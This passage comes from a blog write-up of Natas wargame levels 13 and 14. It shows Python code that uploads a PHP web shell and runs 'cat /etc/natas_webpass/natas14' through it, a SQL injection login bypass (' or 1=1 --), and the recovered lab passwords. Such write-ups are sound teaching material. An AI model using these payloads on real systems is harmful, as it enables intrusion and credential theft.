<span class="org-comment-delimiter"># </span><span class="org-comment">Post the evilFile to the server</span>
<span class="org-variable-name">r</span> = requests.post(url, auth=HTTPBasicAuth(user, PASS_NATAS13), files=evil, data={<span class="org-string">'filename'</span>: <span class="org-string">'evil3.php'</span>})

<span class="org-variable-name">path</span> = re.findall(<span class="org-string">'href="(upload/.*.php)"&gt;'</span>, r.text)[0]
<span class="org-keyword">print</span>(f<span class="org-string">'The path to our uploaded file: {path}\n'</span>)
</pre>
</div>

<pre class="example">
The path to our uploaded file: upload/4ttajmtyw5.php
</pre>


<div class="org-src-container">
<pre class="src src-python" id="orge56b2e0"><span class="org-variable-name">r1</span> = requests.get(url+path+<span class="org-string">'?cmd=cat /etc/natas_webpass/natas14'</span>, auth=HTTPBasicAuth(user, PASS_NATAS13))
<span class="org-comment-delimiter"># </span><span class="org-comment">The password for natas13</span>
<span class="org-keyword">print</span>(r1.text[4:])
</pre>
</div>

<pre class="example">
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
</pre>
</div>
</div>

<div id="outline-container-org8b96ca5" class="outline-2">
<h2 id="Level-14"><a href="#Level-14">Level 14</a></h2>
<div class="outline-text-2" id="text-Level-14">
<p>
This level has a login form. The source code reveals the use of very
simple sql queries, which means we could try some <a href="https://en.wikipedia.org/wiki/SQL_injection#Incorrectly_constructed_SQL_statements">sql injections</a>. The
very first try immediately worked, supplying <code>" or 1=1 --</code> for both
the username and the password.
</p>

<div class="org-src-container">
<pre class="src src-python" id="orgde43bec"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(14)
<span class="org-variable-name">data</span> = {<span class="org-string">'username'</span>: <span class="org-string">'" or 1=1 --'</span>, <span class="org-string">'password'</span>: <span class="org-string">'" or 1=1 --'</span>}

<span class="org-variable-name">r</span> = requests.post(url, auth=HTTPBasicAuth(user, PASS_NATAS14), data=data)

<span class="org-keyword">print</span>(re.findall(<span class="org-string">'password for natas15 is (.*)&lt;br&gt;'</span>, r.text)[0])

</pre>
</div>

<pre class="example">
AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
</pre>
</div>
</div>
</div>
<div id="postamble" class="status">
<br><br>
<div style='text-align: center;'>
  If something is not working, please create an issue
  <a href='https://gitlab.com/bryanrinders/bryanrinders.xyz/-/issues'>here</a>
  .
</div>
<br><hr/>
<footer>
  <div class='copyright-container'>
    <div class='copyright'>
      Copyright &copy; 2022-2024 Bryan Rinders some rights reserved
      <br><br>
      This page is available under a
      <a rel='license' href='http://creativecommons.org/licenses/by/4.0/'>
        CC-BY 4.0
      </a> licence.
    </div>
  </div>
  <br>
  <div class='generated'>
    Created with <a href="https://www.gnu.org/software/emacs/">Emacs</a> 27.1 (<a href="https://orgmode.org">Org</a> mode 9.3) on <a href='https://www.gnu.org'>GNU</a>/<a href='https://www.kernel.org/'>Linux</a>
  </div>
</footer>
</div>
</body>
</html>
